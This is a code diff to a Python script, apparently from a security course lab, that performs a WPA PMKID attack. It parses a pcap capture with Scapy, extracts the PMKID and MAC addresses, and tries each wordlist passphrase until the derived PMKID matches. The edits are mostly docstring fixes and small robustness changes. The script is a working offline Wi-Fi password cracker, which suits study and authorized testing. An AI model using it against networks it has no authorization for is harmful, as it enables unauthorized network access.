@@ -22,14 +22,14 @@ from binascii import a2b_hex, b2a_hex
 from scapy.layers.dot11 import *
 from scapy.layers.eap import EAPOL
 
-from files.pbkdf2 import *
+from pbkdf2 import *
 import hmac
-import re
+
 import argparse
 
 # Gestion des arguments
 parser = argparse.ArgumentParser(prog="WPA PMKID attack on capture", usage="python3 pmkid_attack.py", description="Read a pcap file and try to find packet with PMKID")
-parser.add_argument("-f", "--file", required=True, help="The password file")
+parser.add_argument("-f", "--file", required=False, help="The password file")
 
 args = parser.parse_args()
 
@@ -37,11 +37,11 @@ if args.file:
     wordlist = args.file
 else:
     # We ask how many SSID the user want
-    wordlist = "./passwords.txt"
+    wordlist = "passwords.txt"
 
 def customPRF512(key, A, B):
     """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
+    This function computes the key expansion from the 256 bit PMK to the 512 bit PTK.
     """
     blen = 64
     i = 0
@@ -55,7 +55,7 @@ def customPRF512(key, A, B):
 
 def find_ssid(packets):
     """
-        Loop on all packets and try to found a Beacon frame to fetch the SSID name.
+        Loop on all packets and try to find a Beacon frame to recover the SSID name.
     """
     for packet in packets:
         if Dot11Beacon in packet:
@@ -65,15 +65,15 @@ def find_ssid(packets):
 
 def format_mac(mac):
     """
-        Format a MAC address from aa:bb:cc to aabbcc.
+        Format a MAC address from aa:bb:cc format to aabbcc format.
     """
     return mac.replace(":", "")
 
 
 def get_ap_mac(packets):
     """
-        Loop on all packets and try to found a Beacon frame to get the sender address of the frame. It should be the ap
-        address.
+        Loop on all packets and try to find a Beacon frame to get the sender address of the frame.
+        It should be the AP address.
     """
     for packet in packets:
         if Dot11Beacon in packet:
@@ -83,7 +83,8 @@ def get_ap_mac(packets):
 
 def get_client_mac(packets, ap_mac):
     """
-        Loop on all packets and try to found Auth packets, take the first one and extract the client address. Only if the packet was send to our AP
+        Loop on all packets and try to find Auth packets. Take the first one and extract the client 
+        address, only if the packet was sent to our AP.
     """
     for packet in packets:
         # SI c'est un paquet d'authentification, que c'est le premier des deux et qu'il est bien envoyé à notre AP on va prendre l'adresse du client
@@ -94,21 +95,18 @@ def get_client_mac(packets, ap_mac):
 
 def get_pmkid(packets, source, dest):
     """
-        Loop on all packets and try to found EAPOL packets. We check that the packet is the first
-        packet of the exchange (Nonce exchange). We want the Nonce send by the 'source' parameter
+        Loop on all packets and try to find EAPOL packets. We check that the packet is the first 
+	packet of the exchange. We want the packet exchanged between our client and ou AP
     """
     for packet in packets:
         if EAPOL in packet and a2b_hex(format_mac(packet.addr2)) == source and a2b_hex(
                 format_mac(packet.addr1)) == dest and b2a_hex(packet[Raw].load[1:3]).decode() == "008a":
-            packet.show()
             return packet[Raw].load[-16:]
     return ""
 
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("PMKID_handshake.pcap")
-
-# Important parameters for key derivation - most of them can be obtained from the pcap file
 
 A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 
@@ -129,10 +127,15 @@ n_words = len(list(open(wordlist, "rb")))
 print("Starting to brutforce passphrase")
 print("=============================\n")
 
-from tqdm import tqdm
+HAS_FAILED = False
+
+try:
+    from tqdm import tqdm
+except Exception as e:
+    HAS_FAILED = True
 
 with open(wordlist, 'rb') as f:
-    for line in tqdm(f, total=n_words, unit="word"):
+    for line in f if HAS_FAILED else tqdm(f, total=n_words, unit="word"):
         passPhrase = line.decode().strip('\n').encode()
 
         # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
@@ -142,7 +145,7 @@ with open(wordlist, 'rb') as f:
 
         if pmkid_get == pmkid_calc:
             print("PASSPHRASE FOUND !\n")
-            print("Passphrase:\t\t", line)
-            exit()
+            print("Passphrase:\t\t", line.decode())
+            exit(0)
 
 print("No passphrase found !")
